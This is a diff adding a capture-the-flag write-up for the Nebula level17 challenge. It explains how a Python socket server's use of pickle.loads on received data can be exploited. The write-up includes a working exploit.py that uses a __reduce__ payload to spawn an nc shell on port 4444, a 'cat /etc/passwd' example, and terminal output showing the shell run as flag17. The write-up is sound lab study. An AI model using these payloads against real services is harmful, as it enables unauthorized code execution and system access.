@@ -61,3 +61,72 @@ while True:
                 clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
                 server(clnt)
                 exit(1)
+
+Code Analysis - Python Socket programming
+a. Server listening on port 10007 and running with the privilege of flag17
+ skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+ skt.bind(('0.0.0.0', 10007))
+ skt.listen(10)
+
+b. When clients make connections, child process is forked. 
+ Server process continue listening on port 10007 for next client connection
+ Child process sends an initial message ("Accepted connection from CLIENT_IP:CLIENT_PORT") and waits for next message
+ 
+c. From the child process, pickle.loads() function de-serializes(unpickle) received data and send the received data to the client.
+ obj = pickle.loads(line)  <== Vulnerable code
+ for i in obj:
+     clnt.send("why did you send me " + i + "?\n")
+
+Vulnerabilty and exploit plan
+a. pickle vulnerability
+- When pickle is instantiated, __reduce__ method (constructor) is called. The first argument to __reduce__ is a callable, 
+that is, a function. The next argument is a tuple of arguments for __reduce__. In below example, os.system is the first argument
+and 'cat /etc/passwd' is the second argument. Therefore if we overload pickle's __reduce__() with properly modified exploit code
+and serialize it (pickle.dumps()), the exploit code can be executed during pickle.loads().
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('cat /etc/passwd',))
+        
+b. Basically exploit can be done various way depending on how we place exploit code with __reduce__()
+
+Sol A. - Use reverse shell
+a. Build client python code which makes a connection to a server on 10007 and send exploit code.
+// exploit.py
+import os
+import pickle
+import socket
+
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('nc.traditional -lvnp 4444 -e /bin/sh',))
+
+skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+skt.connect(('localhost', 10007))
+data = skt.recv(1024)
+print("Received: " + data)
+obj = Exploit()
+shellcode = pickle.dumps(obj)
+print("Sending shellcode: " + shellcode)
+skt.send(shellcode)
+data = skt.recv(1024)
+print("Received: " + data)
+
+level17@nebula:~$ python exploit.py
+Received: Accepted connection from 127.0.0.1:35876
+Sending shellcode: cposix
+system
+p0
+(S'nc.traditional -lvnp 4444 -e /bin/sh'
+p1
+tp2
+Rp3
+.
+
+b. Now let's make a connection to 4444 where revershell is setup
+level17@nebula:~$ nc 127.0.0.1 4444
+id
+uid=982(flag17) gid=982(flag17) groups=982(flag17)
+getflag
+You have successfully executed getflag on a target account
